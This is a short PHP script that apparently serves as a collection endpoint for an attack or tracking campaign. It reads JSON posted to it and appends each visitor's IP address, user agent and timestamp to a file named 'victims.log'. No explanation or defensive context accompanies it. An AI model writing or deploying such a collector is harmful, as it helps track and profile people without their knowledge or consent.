
<?php
$data = json_decode(file_get_contents("php://input"), true);
$log = "IP: " . $data['ip'] . " | UA: " . $data['userAgent'] . " | Time: " . $data['time'] . "\n";
file_put_contents("victims.log", $log, FILE_APPEND);
?>
